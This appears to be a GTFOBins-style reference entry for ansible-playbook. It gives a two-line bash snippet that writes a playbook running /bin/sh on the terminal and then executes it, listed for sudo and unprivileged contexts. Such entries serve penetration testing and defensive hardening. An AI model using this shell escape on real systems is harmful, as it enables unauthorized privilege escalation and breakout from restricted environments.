---
type: gtfobin
name: ansible-playbook
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# ansible-playbook

## shell

```bash
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file
ansible-playbook /path/to/temp-file
```
**Contexts:** sudo, unprivileged
